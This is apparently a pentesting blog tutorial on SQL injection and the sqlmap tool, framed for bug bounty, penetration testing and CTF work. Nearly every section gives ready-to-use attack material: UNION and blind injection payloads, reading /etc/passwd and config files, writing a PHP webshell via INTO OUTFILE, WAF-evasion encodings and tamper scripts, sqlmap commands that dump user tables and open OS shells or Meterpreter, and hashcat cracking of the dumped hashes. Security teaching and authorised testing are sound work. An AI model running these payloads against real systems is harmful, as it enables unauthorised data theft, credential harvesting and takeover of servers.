SQL Injection & sqlmap – From Manual Payloads to Full Dumps

2026-06-03 · 1 min read · Tools · sql sqli sqlmap web pentesting

SQL injection is one of the most impactful web vulnerabilities. Learn manual detection and exploitation techniques, then automate the heavy lifting with sqlmap — from basic dumps to OS shell access.

01 What is SQL Injection?

SQL Injection (SQLi) occurs when user-supplied input is inserted into a SQL query without proper sanitisation. An attacker can alter the query logic to bypass authentication, extract data, write files, or execute OS commands.

TypeHow it works
**In-band / UNION**Results returned directly in the HTTP response
**Error-based**DB error messages leak data
**Boolean blind**True/false conditions change page behaviour
**Time-based blind**`SLEEP()` delays confirm injection
**Out-of-band**Data exfiltrated via DNS/HTTP (needs outbound access)

02 Detection – Finding the Injection Point

Start simple — break the query, then confirm control.

sql 
-- Single quote: causes a DB error if vulnerable
'

-- Comment out the rest of the query
' --
' -- -
'#         (MySQL)

-- Always-true condition: returns all rows
' OR '1'='1
' OR 1=1 --
1' OR '1'='1' --

-- Always-false: returns zero rows (page differs from always-true)
' AND '1'='2

-- Arithmetic check: if 1+1=2 response equals normal, injection exists
1+1         → compare with 2 response

-- Time-based blind confirmation
' AND SLEEP(5) --          (MySQL)
'; WAITFOR DELAY '0:0:5'-- (MSSQL)
' AND pg_sleep(5) --       (PostgreSQL)

03 Manual UNION-Based Injection

UNION injection appends a second SELECT to the original query and returns data in the normal response. You need to know the number of columns and data types first.

sql 
-- Step 1: Find column count with ORDER BY
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --    ← error here means 2 columns

-- Alternative: NULL probing
' UNION SELECT NULL --
' UNION SELECT NULL,NULL --
' UNION SELECT NULL,NULL,NULL --

-- Step 2: Find which column is visible in the page
' UNION SELECT 'a',NULL,NULL --
' UNION SELECT NULL,'a',NULL --
' UNION SELECT NULL,NULL,'a' --

-- Step 3: Extract data (MySQL example, 3 columns, col 2 is visible)
' UNION SELECT NULL,database(),NULL --           -- current DB name
' UNION SELECT NULL,user(),NULL --               -- current DB user
' UNION SELECT NULL,@@version,NULL --            -- DB version

-- Step 4: List all databases
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata --

-- Step 5: List tables in a database
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='target_db' --

-- Step 6: List columns in a table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users' --

-- Step 7: Dump the data
' UNION SELECT NULL,concat(username,':',password),NULL FROM users --

04 Boolean Blind Injection

No data in the response — only a difference between true and false (content changes, element appears/disappears, redirect vs no redirect).

sql 
-- Confirm: true vs false gives different page
' AND 1=1 --    ← normal page
' AND 1=2 --    ← different / empty page

-- Extract DB name character by character
' AND substring(database(),1,1)='a' --
' AND substring(database(),1,1)='b' --
-- ... until page returns true

-- Binary search with ASCII (faster)
' AND ascii(substring(database(),1,1)) > 109 --
' AND ascii(substring(database(),1,1)) > 115 --
-- Narrows to exact char in ~7 requests per character

05 File Read / Write (MySQL)

sql 
-- Read a file (requires FILE privilege)
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL --
' UNION SELECT NULL,LOAD_FILE('/var/www/html/config.php'),NULL --

-- Write a webshell (requires write permission on web root)
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL
  INTO OUTFILE '/var/www/html/shell.php' --

-- Then access:
-- http://target.com/shell.php?cmd=id

06 Common Bypasses

sql 
-- WAF / filter bypasses
SELeCT          -- mixed case (some filters are case-sensitive)
SEL/**/ECT      -- inline comments to break keywords
SELECT%09       -- tab instead of space (%09)
/*!SELECT*/     -- MySQL version comment

-- Quote bypass with hex encoding
-- Instead of: WHERE username='admin'
-- Use:        WHERE username=0x61646d696e

-- Space bypass
SELECT/**/username/**/FROM/**/users

-- Double encoding
%2527  →  %27  →  '

-- Second-order injection: stored then re-used
-- Register username: admin'--
-- Used later in: SELECT * FROM users WHERE username='admin'--'

07 sqlmap – Automated SQLi

sqlmap automates detection and exploitation across all injection types and databases. It handles enumeration, dumping, and even OS-level access.

08 sqlmap – Basic Usage

bash 
# Test a URL parameter
sqlmap -u 'http://target.com/item?id=1'

# Specify the parameter explicitly
sqlmap -u 'http://target.com/item?id=1&cat=2' -p id

# POST request
sqlmap -u 'http://target.com/login' --data='user=admin&pass=test'

# Load request from Burp/file (most reliable for complex requests)
sqlmap -r request.txt

# HTTPS
sqlmap -u 'https://target.com/item?id=1' --batch

09 sqlmap – Authentication & Sessions

bash 
# Cookie-based session (authenticated scan)
sqlmap -u 'http://target.com/profile?id=1' --cookie='PHPSESSID=abc123; session=xyz'

# HTTP Basic Auth
sqlmap -u 'http://target.com/admin?id=1' --auth-type=basic --auth-cred='admin:password'

# Custom header injection (e.g. X-Forwarded-For)
sqlmap -u 'http://target.com/' --header='X-Forwarded-For: 1*'

# User agent injection
sqlmap -u 'http://target.com/' --user-agent='Mozilla* '

# Follow redirects
sqlmap -u 'http://target.com/item?id=1' --follow-redirects

10 sqlmap – Enumeration Flags

bash 
# Get current database name
sqlmap -u 'http://target.com/item?id=1' --current-db

# Get current user
sqlmap -u 'http://target.com/item?id=1' --current-user

# Check if user is DBA
sqlmap -u 'http://target.com/item?id=1' --is-dba

# List all databases
sqlmap -u 'http://target.com/item?id=1' --dbs

# List tables in a database
sqlmap -u 'http://target.com/item?id=1' -D target_db --tables

# List columns in a table
sqlmap -u 'http://target.com/item?id=1' -D target_db -T users --columns

# Dump a table
sqlmap -u 'http://target.com/item?id=1' -D target_db -T users --dump

# Dump specific columns
sqlmap -u 'http://target.com/item?id=1' -D target_db -T users -C username,password --dump

# Dump everything (slow on large DBs)
sqlmap -u 'http://target.com/item?id=1' --dump-all

11 sqlmap – Tuning & Speed

bash 
# Risk and level (1-5 each; higher = more aggressive/dangerous tests)
sqlmap -u 'http://target.com/item?id=1' --level=3 --risk=2

# Force specific DB type (skip detection)
sqlmap -u 'http://target.com/item?id=1' --dbms=mysql
sqlmap -u 'http://target.com/item?id=1' --dbms=mssql
sqlmap -u 'http://target.com/item?id=1' --dbms=postgresql

# Force injection technique
sqlmap -u 'http://target.com/item?id=1' --technique=U    # UNION only
sqlmap -u 'http://target.com/item?id=1' --technique=BT   # Boolean + Time-based
sqlmap -u 'http://target.com/item?id=1' --technique=BEUSTQ  # All

# Set number of threads
sqlmap -u 'http://target.com/item?id=1' --threads=5

# Skip confirmation prompts (use defaults)
sqlmap -u 'http://target.com/item?id=1' --batch

# Use a proxy (e.g. Burp)
sqlmap -u 'http://target.com/item?id=1' --proxy='http://127.0.0.1:8080'

12 sqlmap – WAF Bypass

bash 
# Use a tamper script
sqlmap -u 'http://target.com/item?id=1' --tamper=space2comment
sqlmap -u 'http://target.com/item?id=1' --tamper=randomcase
sqlmap -u 'http://target.com/item?id=1' --tamper=between,randomcase,space2comment

# Common tamper scripts:
# space2comment    -- spaces → /**/ 
# randomcase       -- SeLeCt RaNdOm CaSe
# between          -- > → NOT BETWEEN 0 AND
# charencode       -- URL encode chars
# base64encode     -- base64 encode payload
# equaltolike      -- = → LIKE
# modsecurityversioned -- version comments for MySQL

# List all available tampers
sqlmap --list-tampers

# Random user agent to avoid signature detection
sqlmap -u 'http://target.com/item?id=1' --random-agent

# Add delay between requests
sqlmap -u 'http://target.com/item?id=1' --delay=1

13 sqlmap – OS & Shell Access

bash 
# Read a file from the server
sqlmap -u 'http://target.com/item?id=1' --file-read='/etc/passwd'
sqlmap -u 'http://target.com/item?id=1' --file-read='C:/Windows/win.ini'

# Write a file to the server
sqlmap -u 'http://target.com/item?id=1' \
  --file-write='./shell.php' --file-dest='/var/www/html/shell.php'

# Interactive OS shell (via INTO OUTFILE webshell or xp_cmdshell)
sqlmap -u 'http://target.com/item?id=1' --os-shell

# Interactive SQL shell
sqlmap -u 'http://target.com/item?id=1' --sql-shell

# Enable xp_cmdshell on MSSQL
sqlmap -u 'http://target.com/item?id=1' --os-pwn   # Meterpreter / VNC

14 Using a Burp Request File

The most reliable way to use sqlmap on complex requests (with tokens, custom headers, JSON bodies) is to capture the request in Burp and save it.

bash 
# request.txt (copied from Burp "Copy to file" or "Save item")
# GET /item?id=1 HTTP/1.1
# Host: target.com
# Cookie: session=abc123
# ...

sqlmap -r request.txt --batch --level=3

# Mark the injection point explicitly with *
# GET /item?id=1* HTTP/1.1
sqlmap -r request.txt -p id

# For JSON bodies, sqlmap auto-detects -- or mark with *
# {"id": "1*"}

15 Real-World Use Cases

Bug Bounty / Web Application Testing
- Test every user-controlled input: GET/POST parameters, cookies, HTTP headers (User-Agent, X-Forwarded-For, Referer), JSON/XML bodies
- After confirming SQLi, use --current-user --is-dba to assess impact before going further
- --file-read on config files (config.php, web.config, .env) often yields DB credentials, API keys, or secrets
- Always scan with --batch and save a full log with --output-dir for report evidence

Penetration Testing
- MSSQL with DBA rights: --os-shell via xp_cmdshell gives direct command execution
- MySQL: LOAD_FILE + INTO OUTFILE for reading configs and dropping webshells
- Credential harvesting: dump users tables and crack hashes offline with hashcat
- Pivot: leaked DB credentials frequently reused on SSH, admin panels, VPNs

16 CTF / HTB Workflow

bash 
# Step 1: Quick manual check -- does ' cause an error?
curl -s 'http://<target>/item?id=1'
curl -s "http://<target>/item?id=1'"

# Step 2: Confirm with sqlmap
sqlmap -u 'http://<target>/item?id=1' --batch --level=2

# Step 3: Enumerate
sqlmap -u 'http://<target>/item?id=1' --batch --current-db --dbs

# Step 4: Dump users table
sqlmap -u 'http://<target>/item?id=1' --batch \
  -D <dbname> -T users --dump

# Step 5: If hashes found -- crack them
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt    # MD5
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt # bcrypt

# Step 6: Check for file read (common flag location)
sqlmap -u 'http://<target>/item?id=1' --batch \
  --file-read='/var/www/html/config.php'

# Step 7: If DBA and MySQL -- try webshell
sqlmap -u 'http://<target>/item?id=1' --batch --os-shell
CTF Tips:
  • Check cookies, User-Agent, Referer, and X-Forwarded-For headers — blind SQLi in headers is a common HTB trick
  • Login forms: try admin' -- - as username with any password to bypass authentication manually
  • If --dump is slow, use --where to limit rows: --where="username='admin'"
  • Second-order injection: register a malicious username, trigger it on a profile/settings page
  • Look for flag or secret tables: sqlmap ... --tables then grep output for juicy names
  • UNION payloads blocked? Try --technique=T (time-based blind) — slower but works around many filters

17 Quick Reference

Info

Manual detection checklist: ' → ' OR 1=1 -- → ' AND SLEEP(5) --

sqlmap core flags:
- -u URL | -r request file | -p parameter | --data POST body
- --cookie session | --header custom header | --random-agent
- --dbs list DBs | -D select DB | --tables | -T select table
- --columns | -C select cols | --dump | --dump-all
- --current-db | --current-user | --is-dba
- --level 1–5 | --risk 1–3 | --technique BEUSTQ
- --dbms force engine | --batch no prompts | --threads
- --tamper WAF bypass | --proxy Burp | --delay
- --os-shell OS cmd | --sql-shell SQL cmd
- --file-read read file | --file-write + --file-dest write file

Quick one-liner dump:
sqlmap -r req.txt --batch --level=3 --dbs && sqlmap -r req.txt --batch -D target -T users --dump
